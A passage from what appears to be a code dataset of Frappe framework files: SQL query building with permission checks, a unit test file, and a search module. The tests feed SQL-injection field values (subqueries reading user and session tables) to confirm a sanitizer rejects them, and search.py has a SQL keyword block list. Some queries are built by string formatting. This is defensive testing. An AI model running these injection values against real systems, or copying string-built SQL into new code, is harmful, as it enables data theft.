blacklisted_functions):\n\t\t\t\t\t_raise_exception()\n\n\tdef extract_tables(self):\n\t\t\"\"\"extract tables from fields\"\"\"\n\t\tself.tables = ['`tab' + self.doctype + '`']\n\n\t\t# add tables from fields\n\t\tif self.fields:\n\t\t\tfor f in self.fields:\n\t\t\t\tif ( not (\"tab\" in f and \".\" in f) ) or (\"locate(\" in f) or (\"count(\" in f):\n\t\t\t\t\tcontinue\n\n\t\t\t\ttable_name = f.split('.')[0]\n\t\t\t\tif table_name.lower().startswith('group_concat('):\n\t\t\t\t\ttable_name = table_name[13:]\n\t\t\t\tif table_name.lower().startswith('ifnull('):\n\t\t\t\t\ttable_name = table_name[7:]\n\t\t\t\tif not table_name[0]=='`':\n\t\t\t\t\ttable_name = '`' + table_name + '`'\n\t\t\t\tif not table_name in self.tables:\n\t\t\t\t\tself.append_table(table_name)\n\n\tdef append_table(self, table_name):\n\t\tself.tables.append(table_name)\n\t\tdoctype = table_name[4:-1]\n\t\tif (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):\n\t\t\tfrappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))\n\t\t\traise frappe.PermissionError(doctype)\n\n\tdef set_field_tables(self):\n\t\t'''If there are more than one table, the fieldname must not be ambigous.\n\t\tIf the fieldname is not explicitly mentioned, set the default table'''\n\t\tif len(self.tables) > 1:\n\t\t\tfor i, f in enumerate(self.fields):\n\t\t\t\tif '.' not in f:\n\t\t\t\t\tself.fields[i] = '{0}.{1}'.format(self.tables[0], f)\n\n\tdef set_optional_columns(self):\n\t\t\"\"\"Removes optional columns like `_user_tags`, `_comments` etc. if not in table\"\"\"\n\t\tcolumns = frappe.db.get_table_columns(self.doctype)\n\n\t\t# remove from fields\n\t\tto_remove = []\n\t\tfor fld in self.fields:\n\t\t\tfor f in optional_fields:\n\t\t\t\tif f in fld and not f in columns:\n\t\t\t\t\tto_remove.append(fld)\n\n\t\tfor fld in to_remove:\n\t\t\tdel self.fields[self.fields.index(fld)]\n\n\t\t# remove from filters\n\t\tto_remove = []\n\t\tfor each in self.filters:\n\t\t\tif isinstance(each, string_types):\n\t\t\t\teach = [each]\n\n\t\t\tfor element in each:\n\t\t\t\tif element in optional_fields and element not in columns:\n\t\t\t\t\tto_remove.append(each)\n\n\t\tfor each in to_remove:\n\t\t\tif isinstance(self.filters, dict):\n\t\t\t\tdel self.filters[each]\n\t\t\telse:\n\t\t\t\tself.filters.remove(each)\n\n\tdef build_conditions(self):\n\t\tself.conditions = []\n\t\tself.grouped_or_conditions = []\n\t\tself.build_filter_conditions(self.filters, self.conditions)\n\t\tself.build_filter_conditions(self.or_filters, self.grouped_or_conditions)\n\n\t\t# match conditions\n\t\tif not self.flags.ignore_permissions:\n\t\t\tmatch_conditions = self.build_match_conditions()\n\t\t\tif match_conditions:\n\t\t\t\tself.conditions.append(\"(\" + match_conditions + \")\")\n\n\tdef build_filter_conditions(self, filters, conditions, ignore_permissions=None):\n\t\t\"\"\"build conditions from user filters\"\"\"\n\t\tif ignore_permissions is not None:\n\t\t\tself.flags.ignore_permissions = ignore_permissions\n\n\t\tif isinstance(filters, dict):\n\t\t\tfilters = [filters]\n\n\t\tfor f in filters:\n\t\t\tif isinstance(f, string_types):\n\t\t\t\tconditions.append(f)\n\t\t\telse:\n\t\t\t\tconditions.append(self.prepare_filter_condition(f))\n\n\tdef prepare_filter_condition(self, f):\n\t\t\"\"\"Returns a filter condition in the format:\n\n\t\t\t\tifnull(`tabDocType`.`fieldname`, fallback) operator \"value\"\n\t\t\"\"\"\n\n\t\tf = get_filter(self.doctype, f)\n\n\t\ttname = ('`tab' + f.doctype + '`')\n\t\tif not tname in self.tables:\n\t\t\tself.append_table(tname)\n\n\t\tif 'ifnull(' in f.fieldname:\n\t\t\tcolumn_name = f.fieldname\n\t\telse:\n\t\t\tcolumn_name = '{tname}.{fname}'.format(tname=tname,\n\t\t\t\tfname=f.fieldname)\n\n\t\tcan_be_null = True\n\n\t\t# prepare in condition\n\t\tif f.operator.lower() in ('in', 'not in'):\n\t\t\tvalues = f.value or ''\n\t\t\tif not isinstance(values, (list, tuple)):\n\t\t\t\tvalues = values.split(\",\")\n\n\t\t\tfallback = \"''\"\n\t\t\tvalue = (frappe.db.escape((v or '').strip(), percent=False) for v in values)\n\t\t\tvalue = '(\"{0}\")'.format('\", \"'.join(value))\n\t\telse:\n\t\t\tdf = frappe.get_meta(f.doctype).get(\"fields\", {\"fieldname\": f.fieldname})\n\t\t\tdf = df[0] if df else None\n\n\t\t\tif df and df.fieldtype in (\"Check\", \"Float\", \"Int\", \"Currency\", \"Percent\"):\n\t\t\t\tcan_be_null = False\n\n\t\t\tif f.operator.lower() == 'between' and \\\n\t\t\t\t(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype==\"Date\" or df.fieldtype==\"Datetime\"))):\n\n\t\t\t\tvalue = get_between_date_filter(f.value, df)\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\n\t\t\telif df and df.fieldtype==\"Date\":\n\t\t\t\tvalue = getdate(f.value).strftime(\"%Y-%m-%d\")\n\t\t\t\tfallback = \"'0000-00-00'\"\n\n\t\t\telif (df and df.fieldtype==\"Datetime\") or isinstance(f.value, datetime):\n\t\t\t\tvalue = get_datetime(f.value).strftime(\"%Y-%m-%d %H:%M:%S.%f\")\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\n\t\t\telif df and df.fieldtype==\"Time\":\n\t\t\t\tvalue = get_time(f.value).strftime(\"%H:%M:%S.%f\")\n\t\t\t\tfallback = \"'00:00:00'\"\n\n\t\t\telif f.operator.lower() in (\"like\", \"not like\") or (isinstance(f.value, string_types) and\n\t\t\t\t(not df or df.fieldtype not in [\"Float\", \"Int\", \"Currency\", \"Percent\", \"Check\"])):\n\t\t\t\t\tvalue = \"\" if f.value==None else f.value\n\t\t\t\t\tfallback = '\"\"'\n\n\t\t\t\t\tif f.operator.lower() in (\"like\", \"not like\") and isinstance(value, string_types):\n\t\t\t\t\t\t# because \"like\" uses backslash (\\) for escaping\n\t\t\t\t\t\tvalue = value.replace(\"\\\\\", \"\\\\\\\\\").replace(\"%\", \"%%\")\n\n\t\t\telse:\n\t\t\t\tvalue = flt(f.value)\n\t\t\t\tfallback = 0\n\n\t\t\t# put it inside double quotes\n\t\t\tif isinstance(value, string_types) and not f.operator.lower() == 'between':\n\t\t\t\tvalue = '\"{0}\"'.format(frappe.db.escape(value, percent=False))\n\n\t\tif (self.ignore_ifnull\n\t\t\tor not can_be_null\n\t\t\tor (f.value and f.operator.lower() in ('=', 'like'))\n\t\t\tor 'ifnull(' in column_name.lower()):\n\t\t\tcondition = '{column_name} {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, operator=f.operator,\n\t\t\t\tvalue=value)\n\t\telse:\n\t\t\tcondition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, fallback=fallback, operator=f.operator,\n\t\t\t\tvalue=value)\n\n\t\treturn condition\n\n\tdef build_match_conditions(self, as_condition=True):\n\t\t\"\"\"add match conditions if applicable\"\"\"\n\t\tself.match_filters = []\n\t\tself.match_conditions = []\n\t\tonly_if_shared = False\n\t\tif not self.user:\n\t\t\tself.user = frappe.session.user\n\n\t\tif not self.tables: self.extract_tables()\n\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\trole_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)\n\n\t\tself.shared = frappe.share.get_shared(self.doctype, self.user)\n\n\t\tif not meta.istable and not role_permissions.get(\"read\") and not self.flags.ignore_permissions:\n\t\t\tonly_if_shared = True\n\t\t\tif not self.shared:\n\t\t\t\tfrappe.throw(_(\"No permission to read {0}\").format(self.doctype), frappe.PermissionError)\n\t\t\telse:\n\t\t\t\tself.conditions.append(self.get_share_condition())\n\n\t\telse:\n\t\t\t# apply user permissions?\n\t\t\tif role_permissions.get(\"apply_user_permissions\", {}).get(\"read\"):\n\t\t\t\t# get user permissions\n\t\t\t\tuser_permissions = frappe.permissions.get_user_permissions(self.user)\n\t\t\t\tself.add_user_permissions(user_permissions,\n\t\t\t\t\tuser_permission_doctypes=role_permissions.get(\"user_permission_doctypes\").get(\"read\"))\n\n\t\t\tif role_permissions.get(\"if_owner\", {}).get(\"read\"):\n\t\t\t\tself.match_conditions.append(\"`tab{0}`.owner = '{1}'\".format(self.doctype,\n\t\t\t\t\tfrappe.db.escape(self.user, percent=False)))\n\n\t\tif as_condition:\n\t\t\tconditions = \"\"\n\t\t\tif self.match_conditions:\n\t\t\t\t# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))\n\t\t\t\tconditions = \"((\" + \") or (\".join(self.match_conditions) + \"))\"\n\n\t\t\tdoctype_conditions = self.get_permission_query_conditions()\n\t\t\tif doctype_conditions:\n\t\t\t\tconditions += (' and ' + doctype_conditions) if conditions else doctype_conditions\n\n\t\t\t# share is an OR condition, if there is a role permission\n\t\t\tif not only_if_shared and self.shared and conditions:\n\t\t\t\tconditions =  \"({conditions}) or ({shared_condition})\".format(\n\t\t\t\t\tconditions=conditions, shared_condition=self.get_share_condition())\n\n\t\t\treturn conditions\n\n\t\telse:\n\t\t\treturn self.match_filters\n\n\tdef get_share_condition(self):\n\t\treturn \"\"\"`tab{0}`.name in ({1})\"\"\".format(self.doctype, \", \".join([\"'%s'\"] * len(self.shared))) % \\\n\t\t\ttuple([frappe.db.escape(s, percent=False) for s in self.shared])\n\n\tdef add_user_permissions(self, user_permissions, user_permission_doctypes=None):\n\t\tuser_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\tfor doctypes in user_permission_doctypes:\n\t\t\tmatch_filters = {}\n\t\t\tmatch_conditions = []\n\t\t\t# check in links\n\t\t\tfor df in meta.get_fields_to_check_permissions(doctypes):\n\t\t\t\tuser_permission_values = user_permissions.get(df.options, [])\n\n\t\t\t\tcond = 'ifnull(`tab{doctype}`.`{fieldname}`, \"\")=\"\"'.format(doctype=self.doctype, fieldname=df.fieldname)\n\t\t\t\tif user_permission_values:\n\t\t\t\t\tif not cint(frappe.get_system_settings(\"apply_strict_user_permissions\")):\n\t\t\t\t\t\tcondition = cond + \" or \"\n\t\t\t\t\telse:\n\t\t\t\t\t\tcondition = \"\"\n\t\t\t\t\tcondition += \"\"\"`tab{doctype}`.`{fieldname}` in ({values})\"\"\".format(\n\t\t\t\t\t\tdoctype=self.doctype, fieldname=df.fieldname,\n\t\t\t\t\t\tvalues=\", \".join([('\"'+frappe.db.escape(v, percent=False)+'\"') for v in user_permission_values]))\n\t\t\t\telse:\n\t\t\t\t\tcondition = cond\n\n\t\t\t\tmatch_conditions.append(\"({condition})\".format(condition=condition))\n\n\t\t\t\tmatch_filters[df.options] = user_permission_values\n\n\t\t\tif match_conditions:\n\t\t\t\tself.match_conditions.append(\" and \".join(match_conditions))\n\n\t\t\tif match_filters:\n\t\t\t\tself.match_filters.append(match_filters)\n\n\tdef get_permission_query_conditions(self):\n\t\tcondition_methods = frappe.get_hooks(\"permission_query_conditions\", {}).get(self.doctype, [])\n\t\tif condition_methods:\n\t\t\tconditions = []\n\t\t\tfor method in condition_methods:\n\t\t\t\tc = frappe.call(frappe.get_attr(method), self.user)\n\t\t\t\tif c:\n\t\t\t\t\tconditions.append(c)\n\n\t\t\treturn \" and \".join(conditions) if conditions else None\n\n\tdef run_custom_query(self, query):\n\t\tif '%(key)s' in query:\n\t\t\tquery = query.replace('%(key)s', 'name')\n\t\treturn frappe.db.sql(query, as_dict = (not self.as_list))\n\n\tdef set_order_by(self, args):\n\t\tmeta = frappe.get_meta(self.doctype)\n\n\t\tif self.order_by:\n\t\t\targs.order_by = self.order_by\n\t\telse:\n\t\t\targs.order_by = \"\"\n\n\t\t\t# don't add order by from meta if a mysql group function is used without group by clause\n\t\t\tgroup_function_without_group_by = (len(self.fields)==1 and\n\t\t\t\t(\tself.fields[0].lower().startswith(\"count(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"min(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"max(\")\n\t\t\t\t) and not self.group_by)\n\n\t\t\tif not group_function_without_group_by:\n\t\t\t\tsort_field = sort_order = None\n\t\t\t\tif meta.sort_field and ',' in meta.sort_field:\n\t\t\t\t\t# multiple sort given in doctype definition\n\t\t\t\t\t# Example:\n\t\t\t\t\t# `idx desc, modified desc`\n\t\t\t\t\t# will covert to\n\t\t\t\t\t# `tabItem`.`idx` desc, `tabItem`.`modified` desc\n\t\t\t\t\targs.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,\n\t\t\t\t\t\tf.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])\n\t\t\t\telse:\n\t\t\t\t\tsort_field = meta.sort_field or 'modified'\n\t\t\t\t\tsort_order = (meta.sort_field and meta.sort_order) or 'desc'\n\n\t\t\t\t\targs.order_by = \"`tab{0}`.`{1}` {2}\".format(self.doctype, sort_field or \"modified\", sort_order or \"desc\")\n\n\t\t\t\t# draft docs always on top\n\t\t\t\tif meta.is_submittable:\n\t\t\t\t\targs.order_by = \"`tab{0}`.docstatus asc, {1}\".format(self.doctype, args.order_by)\n\n\tdef validate_order_by_and_group_by(self, parameters):\n\t\t\"\"\"Check order by, group by so that atleast one column is selected and does not have subquery\"\"\"\n\t\tif not parameters:\n\t\t\treturn\n\n\t\t_lower = parameters.lower()\n\t\tif 'select' in _lower and ' from ' in _lower:\n\t\t\tfrappe.throw(_('Cannot use sub-query in order by'))\n\n\n\t\tfor field in parameters.split(\",\"):\n\t\t\tif \".\" in field and field.strip().startswith(\"`tab\"):\n\t\t\t\ttbl = field.strip().split('.')[0]\n\t\t\t\tif tbl not in self.tables:\n\t\t\t\t\tif tbl.startswith('`'):\n\t\t\t\t\t\ttbl = tbl[4:-1]\n\t\t\t\t\tfrappe.throw(_(\"Please select atleast 1 column from {0} to sort/group\").format(tbl))\n\n\tdef add_limit(self):\n\t\tif self.limit_page_length:\n\t\t\treturn 'limit %s, %s' % (self.limit_start, self.limit_page_length)\n\t\telse:\n\t\t\treturn ''\n\n\tdef add_comment_count(self, result):\n\t\tfor r in result:\n\t\t\tif not r.name:\n\t\t\t\tcontinue\n\n\t\t\tr._comment_count = 0\n\t\t\tif \"_comments\" in r:\n\t\t\t\tr._comment_count = len(json.loads(r._comments or \"[]\"))\n\n\tdef update_user_settings(self):\n\t\t# update user settings if new search\n\t\tuser_settings = json.loads(get_user_settings(self.doctype))\n\n\t\tif hasattr(self, 'user_settings'):\n\t\t\tuser_settings.update(self.user_settings)\n\n\t\tif self.save_user_settings_fields:\n\t\t\tuser_settings['fields'] = self.user_settings_fields\n\n\t\tupdate_user_settings(self.doctype, user_settings)\n\ndef get_order_by(doctype, meta):\n\torder_by = \"\"\n\n\tsort_field = sort_order = None\n\tif meta.sort_field and ',' in meta.sort_field:\n\t\t# multiple sort given in doctype definition\n\t\t# Example:\n\t\t# `idx desc, modified desc`\n\t\t# will covert to\n\t\t# `tabItem`.`idx` desc, `tabItem`.`modified` desc\n\t\torder_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,\n\t\t\tf.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])\n\telse:\n\t\tsort_field = meta.sort_field or 'modified'\n\t\tsort_order = (meta.sort_field and meta.sort_order) or 'desc'\n\n\t\torder_by = \"`tab{0}`.`{1}` {2}\".format(doctype, sort_field or \"modified\", sort_order or \"desc\")\n\n\t# draft docs always on top\n\tif meta.is_submittable:\n\t\torder_by = \"`tab{0}`.docstatus asc, {1}\".format(doctype, order_by)\n\n\treturn order_by\n\n\n@frappe.whitelist()\ndef get_list(doctype, *args, **kwargs):\n\t'''wrapper for DatabaseQuery'''\n\tkwargs.pop('cmd', None)\n\treturn DatabaseQuery(doctype).execute(None, *args, **kwargs)\n\ndef is_parent_only_filter(doctype, filters):\n\t#check if filters contains only parent doctype\n\tonly_parent_doctype = True\n\n\tif isinstance(filters, list):\n\t\tfor flt in filters:\n\t\t\tif doctype not in flt:\n\t\t\t\tonly_parent_doctype = False\n\t\t\tif 'Between' in flt:\n\t\t\t\tflt[3] = get_between_date_filter(flt[3])\n\n\treturn only_parent_doctype\n\ndef get_between_date_filter(value, df=None):\n\t'''\n\t\treturn the formattted date as per the given example\n\t\t[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'\n\t'''\n\tfrom_date = None\n\tto_date = None\n\tdate_format = \"%Y-%m-%d %H:%M:%S.%f\"\n\n\tif df:\n\t\tdate_format = \"%Y-%m-%d %H:%M:%S.%f\" if df.fieldtype == 'Datetime' else \"%Y-%m-%d\"\n\n\tif value and isinstance(value, (list, tuple)):\n\t\tif len(value) >= 1: from_date = value[0]\n\t\tif len(value) >= 2: to_date = value[1]\n\n\tif not df or (df and df.fieldtype == 'Datetime'):\n\t\tto_date = add_to_date(to_date,days=1)\n\n\tdata = \"'%s' AND '%s'\" % (\n\t\tget_datetime(from_date).strftime(date_format),\n\t\tget_datetime(to_date).strftime(date_format))\n\n\treturn data\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/mbhavesh95863/frappe/blob/9e2e65f3054c52652b3491713f28d80b80efdfd3",
        "file_path": "/frappe/tests/test_db_query.py",
        "source": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\nfrom __future__ import unicode_literals\n\nimport frappe, unittest\n\nfrom frappe.model.db_query import DatabaseQuery\nfrom frappe.desk.reportview import get_filters_cond\n\nclass TestReportview(unittest.TestCase):\n\tdef test_basic(self):\n\t\tself.assertTrue({\"name\":\"DocType\"} in DatabaseQuery(\"DocType\").execute(limit_page_length=None))\n\n\tdef test_fields(self):\n\t\tself.assertTrue({\"name\":\"DocType\", \"issingle\":0} \\\n\t\t\tin DatabaseQuery(\"DocType\").execute(fields=[\"name\", \"issingle\"], limit_page_length=None))\n\n\tdef test_filters_1(self):\n\t\tself.assertFalse({\"name\":\"DocType\"} \\\n\t\t\tin DatabaseQuery(\"DocType\").execute(filters=[[\"DocType\", \"name\", \"like\", \"J%\"]]))\n\n\tdef test_filters_2(self):\n\t\tself.assertFalse({\"name\":\"DocType\"} \\\n\t\t\tin DatabaseQuery(\"DocType\").execute(filters=[{\"name\": [\"like\", \"J%\"]}]))\n\n\tdef test_filters_3(self):\n\t\tself.assertFalse({\"name\":\"DocType\"} \\\n\t\t\tin DatabaseQuery(\"DocType\").execute(filters={\"name\": [\"like\", \"J%\"]}))\n\n\tdef test_filters_4(self):\n\t\tself.assertTrue({\"name\":\"DocField\"} \\\n\t\t\tin DatabaseQuery(\"DocType\").execute(filters={\"name\": \"DocField\"}))\n\n\tdef test_in_not_in_filters(self):\n\t\tself.assertFalse(DatabaseQuery(\"DocType\").execute(filters={\"name\": [\"in\", None]}))\n\t\tself.assertTrue({\"name\":\"DocType\"} \\\n\t\t\t\tin DatabaseQuery(\"DocType\").execute(filters={\"name\": [\"not in\", None]}))\n\n\t\tfor result in [{\"name\":\"DocType\"}, {\"name\":\"DocField\"}]:\n\t\t\tself.assertTrue(result\n\t\t\t\tin DatabaseQuery(\"DocType\").execute(filters={\"name\": [\"in\", 'DocType,DocField']}))\n\n\t\tfor result in [{\"name\":\"DocType\"}, {\"name\":\"DocField\"}]:\n\t\t\tself.assertFalse(result\n\t\t\t\tin DatabaseQuery(\"DocType\").execute(filters={\"name\": [\"not in\", 'DocType,DocField']}))\n\n\tdef test_or_filters(self):\n\t\tdata = DatabaseQuery(\"DocField\").execute(\n\t\t\t\tfilters={\"parent\": \"DocType\"}, fields=[\"fieldname\", \"fieldtype\"],\n\t\t\t\tor_filters=[{\"fieldtype\":\"Table\"}, {\"fieldtype\":\"Select\"}])\n\n\t\tself.assertTrue({\"fieldtype\":\"Table\", \"fieldname\":\"fields\"} in data)\n\t\tself.assertTrue({\"fieldtype\":\"Select\", \"fieldname\":\"document_type\"} in data)\n\t\tself.assertFalse({\"fieldtype\":\"Check\", \"fieldname\":\"issingle\"} in data)\n\n\tdef test_between_filters(self):\n\t\t\"\"\" test case to check between filter for date fields \"\"\"\n\t\tfrappe.db.sql(\"delete from tabEvent\")\n\n\t\t# create events to test the between operator filter\n\t\ttodays_event = create_event()\n\t\tevent1 = create_event(starts_on=\"2016-07-05 23:59:59\")\n\t\tevent2 = create_event(starts_on=\"2016-07-06 00:00:00\")\n\t\tevent3 = create_event(starts_on=\"2016-07-07 23:59:59\")\n\t\tevent4 = create_event(starts_on=\"2016-07-08 00:00:01\")\n\n\t\t# if the values are not passed in filters then event should be filter as current datetime\n\t\tdata = DatabaseQuery(\"Event\").execute(\n\t\t\tfilters={\"starts_on\": [\"between\", None]}, fields=[\"name\"])\n\n\t\tself.assertTrue({ \"name\": event1.name } not in data)\n\n\t\t# if both from and to_date values are passed\n\t\tdata = DatabaseQuery(\"Event\").execute(\n\t\t\tfilters={\"starts_on\": [\"between\", [\"2016-07-06\", \"2016-07-07\"]]},\n\t\t\tfields=[\"name\"])\n\n\t\tself.assertTrue({ \"name\": event2.name } in data)\n\t\tself.assertTrue({ \"name\": event3.name } in data)\n\t\tself.assertTrue({ \"name\": event1.name } not in data)\n\t\tself.assertTrue({ \"name\": event4.name } not in data)\n\n\t\t# if only one value is passed in the filter\n\t\tdata = DatabaseQuery(\"Event\").execute(\n\t\t\tfilters={\"starts_on\": [\"between\", [\"2016-07-07\"]]},\n\t\t\tfields=[\"name\"])\n\n\t\tself.assertTrue({ \"name\": event3.name } in data)\n\t\tself.assertTrue({ \"name\": event4.name } in data)\n\t\tself.assertTrue({ \"name\": todays_event.name } in data)\n\t\tself.assertTrue({ \"name\": event1.name } not in data)\n\t\tself.assertTrue({ \"name\": event2.name } not in data)\n\n\tdef test_ignore_permissions_for_get_filters_cond(self):\n\t\tfrappe.set_user('test1@example.com')\n\t\tself.assertRaises(frappe.PermissionError, get_filters_cond, 'DocType', dict(istable=1), [])\n\t\tself.assertTrue(get_filters_cond('DocType', dict(istable=1), [], ignore_permissions=True))\n\t\tfrappe.set_user('Administrator')\n\n\tdef test_query_fields_sanitizer(self):\n\t\tself.assertRaises(frappe.DataError, DatabaseQuery(\"DocType\").execute,\n\t\t\t\tfields=[\"name\", \"issingle, version()\"], limit_start=0, limit_page_length=1)\n\n\t\tself.assertRaises(frappe.DataError, DatabaseQuery(\"DocType\").execute,\n\t\t\tfields=[\"name\", \"issingle, IF(issingle=1, (select name from tabUser), count(name))\"],\n\t\t\tlimit_start=0, limit_page_length=1)\n\n\t\tself.assertRaises(frappe.DataError, DatabaseQuery(\"DocType\").execute,\n\t\t\tfields=[\"name\", \"issingle, (select count(*) from tabSessions)\"],\n\t\t\tlimit_start=0, limit_page_length=1)\n\n\t\tself.assertRaises(frappe.DataError, DatabaseQuery(\"DocType\").execute,\n\t\t\tfields=[\"name\", \"issingle, SELECT LOCATE('', `tabUser`.`user`) AS user;\"],\n\t\t\tlimit_start=0, limit_page_length=1)\n\n\t\tself.assertRaises(frappe.DataError, DatabaseQuery(\"DocType\").execute,\n\t\t\tfields=[\"name\", \"issingle, IF(issingle=1, (SELECT name from tabUser), count(*))\"],\n\t\t\tlimit_start=0, limit_page_length=1)\n\n\t\tdata = DatabaseQuery(\"DocType\").execute(fields=[\"name\", \"issingle\", \"count(name)\"],\n\t\t\tlimit_start=0, limit_page_length=1)\n\t\tself.assertTrue('count(name)' in data[0])\n\n\t\tdata = DatabaseQuery(\"DocType\").execute(fields=[\"name\", \"issingle\", \"locate('', name) as _relevance\"],\n\t\t\tlimit_start=0, limit_page_length=1)\n\t\tself.assertTrue('_relevance' in data[0])\n\n\t\tdata = DatabaseQuery(\"DocType\").execute(fields=[\"name\", \"issingle\", \"date(creation) as creation\"],\n\t\t\tlimit_start=0, limit_page_length=1)\n\t\tself.assertTrue('creation' in data[0])\n\n\t\tdata = DatabaseQuery(\"DocType\").execute(fields=[\"name\", \"issingle\",\n\t\t\t\"datediff(modified, creation) as date_diff\"], limit_start=0, limit_page_length=1)\n\t\tself.assertTrue('date_diff' in data[0])\n\ndef create_event(subject=\"_Test Event\", starts_on=None):\n\t\"\"\" create a test event \"\"\"\n\n\tfrom frappe.utils import get_datetime\n\n\tevent = frappe.get_doc({\n\t\t\"doctype\": \"Event\",\n\t\t\"subject\": subject,\n\t\t\"event_type\": \"Public\",\n\t\t\"starts_on\": get_datetime(starts_on),\n\t}).insert(ignore_permissions=True)\n\n\treturn event",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/mbhavesh95863/frappe/blob/8ad60a25b9d382c2b0ee7c78f1dd118e2d18066b",
        "file_path": "/frappe/desk/search.py",
        "source": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\n# Search\nfrom __future__ import unicode_literals\nimport frappe, json\nfrom frappe.utils import cstr, unique\nfrom frappe import _\nfrom six import string_types\n\n\ndef sanitize_searchfield(searchfield):\n\tblacklisted_keywords = ['select', 'delete', 'drop', 'update', 'case', 'and', 'or', 'like']\n\n\tdef _raise_exception():\n\t\tfrappe.throw(_('Invalid Search Field'), frappe.DataError)\n\n\tif len(searchfield) >= 3:\n\n\t\t# to avoid 1=1\n\t\tif '=' in searchfield:\n\t\t\t_raise_exception()\n\n\t\t# in mysql -- is used for commenting the query\n\t\telif ' --' in searchfield:\n\t\t\t_raise_exception()\n\n\t\t# to avoid and, or and like\n\t\telif any(' {0} '.format(keyword) in searchfield.split() for keyword in blacklisted_keywords):\n\t\t\t_raise_exception()\n\n\t\t# to avoid select, delete, drop, update and case\n\t\telif any(keyword in searchfield.split() for keyword in blacklisted_keywords):\n\t\t\t_raise_exception()\n\n# this is called by the Link Field\n@frappe.whitelist()\ndef search_link(doctype, txt, query=None, filters=None, page_length=20, searchfield=None):\n\tsearch_widget(doctype, txt, query, searchfield=searchfield, page_length=page_length, filters=filters)\n\tfrappe.response['results'] = build_for_autosuggest(frappe.response[\"values\"])\n\tdel frappe.response[\"values\"]\n\n# this is called by the search box\n@frappe.whitelist()\ndef search_widget(doctype, txt, query=None, searchfield=None, start=0,\n\tpage_length=10, filters=None, filter_fields=None, as_dict=False):\n\tif isinstance(filters, string_types):\n\t\tfilters = json.loads(filters)\n\n\tmeta = frappe.get_meta(doctype)\n\n\tif searchfield:\n\t\tsanitize_searchfield(searchfield)\n\n\tif not searchfield:\n\t\tsearchfield = \"name\"\n\n\tstandard_queries = frappe.get_hooks().standard_queries or {}\n\n\tif query and query.split()[0].lower()!=\"select\":\n\t\t# by method\n\t\tfrappe.response[\"values\"] = frappe.call(query, doctype, txt,\n\t\t\tsearchfield, start, page_length, filters, as_dict=as_dict)\n\telif not query and doctype in standard_queries:\n\t\t# from standard queries\n\t\tsearch_widget(doctype, txt, standard_queries[doctype][0],\n\t\t\tsearchfield, start, page_length, filters)\n\telse:\n\t\tif query:\n\t\t\tfrappe.throw(_(\"This query style is discontinued\"))\n\t\t\t# custom query\n\t\t\t# frappe.response[\"values\"] = frappe.db.sql(scrub_custom_query(query, searchfield, txt))\n\t\telse:\n\t\t\tif isinstance(filters, dict):\n\t\t\t\tfilters_items = filters.items()\n\t\t\t\tfilters = []\n\t\t\t\tfor f in filters_items:\n\t\t\t\t\tif isinstance(f[1], (list, tuple)):\n\t\t\t\t\t\tfilters.append([doctype, f[0], f[1][0], f[1][1]])\n\t\t\t\t\telse:\n\t\t\t\t\t\tfilters.append([doctype, f[0], \"=\", f[1]])\n\n\t\t\tif filters==None:\n\t\t\t\tfilters = []\n\t\t\tor_filters = []\n\n\n\t\t\t# build from doctype\n\t\t\tif txt:\n\t\t\t\tsearch_fields = [\"name\"]\n\t\t\t\tif meta.title_field:\n\t\t\t\t\tsearch_fields.append(meta.title_field)\n\n\t\t\t\tif meta.search_fields:\n\t\t\t\t\tsearch_fields.extend(meta.get_search_fields())\n\n\t\t\t\tfor f in search_fields:\n\t\t\t\t\tfmeta = meta.get_field(f.strip())\n\t\t\t\t\tif f == \"name\" or (fmeta and fmeta.fieldtype in [\"Data\", \"Text\", \"Small Text\", \"Long Text\",\n\t\t\t\t\t\t\"Link\", \"Select\", \"Read Only\", \"Text Editor\"]):\n\t\t\t\t\t\t\tor_filters.append([doctype, f.strip(), \"like\", \"%{0}%\".format(txt)])\n\n\t\t\tif meta.get(\"fields\", {\"fieldname\":\"enabled\", \"fieldtype\":\"Check\"}):\n\t\t\t\tfilters.append([doctype, \"enabled\", \"=\", 1])\n\t\t\tif meta.get(\"fields\", {\"fieldname\":\"disabled\", \"fieldtype\":\"Check\"}):\n\t\t\t\tfilters.append([doctype, \"disabled\", \"!=\", 1])\n\n\t\t\t# format a list of fields combining search fields and filter fields\n\t\t\tfields = get_std_fields_list(meta, searchfield or \"name\")\n\t\t\tif filter_fields:\n\t\t\t\tfields = list(set(fields + json.loads(filter_fields)))\n\t\t\tformatted_fields = ['`tab%s`.`%s`' % (meta.name, f.strip()) for f in fields]\n\n\t\t\t# find relevance as location of search term from the beginning of string `name`. used for sorting results.\n\t\t\tformatted_fields.append(\"\"\"locate(\"{_txt}\", `tab{doctype}`.`name`) as `_relevance`\"\"\".format(\n\t\t\t\t_txt=frappe.db.escape((txt or \"\").replace(\"%\", \"\")), doctype=frappe.db.escape(doctype)))\n\n\n\t\t\t# In order_by, `idx` gets second priority, because it stores link count\n\t\t\tfrom frappe.model.db_query import get_order_by\n\t\t\torder_by_based_on_meta = get_order_by(doctype, meta)\n\t\t\torder_by = \"if(_relevance, _relevance, 99999), `tab{0}`.idx desc, 